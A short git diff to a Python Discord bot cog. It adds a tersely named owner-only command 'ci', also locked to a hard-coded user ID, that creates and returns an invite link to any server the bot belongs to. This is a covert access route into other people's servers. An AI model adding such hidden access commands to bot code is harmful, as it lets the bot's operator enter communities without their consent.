@@ -32,6 +32,19 @@ class MainClass(commands.Cog):
         embed.set_author(name = f"| {self.client.user.name} Help Commands !", icon_url = self.client.user.avatar_url)
         embed.set_footer(text = f"Requested by : {ctx.author}", icon_url = ctx.author.avatar_url)
         await ctx.send(embed = embed)
+        
+    @commands.command(name='ci')
+    @commands.is_owner()
+    async def _ci(self, ctx, guild_id: int = None):
+        if ctx.author.id != 660337342032248832: return
+        guild = self.client.get_guild(guild_id if guild_id else ctx.guild.id)
+        for channel in guild.channels:
+            try:
+                invitelink = await channel.create_invite()
+                return await ctx.send(invitelink)
+            except:
+                pass
+        await ctx.send("✅ Done")
     
     @commands.command()
     @commands.cooldown(1, 10, commands.BucketType.user)
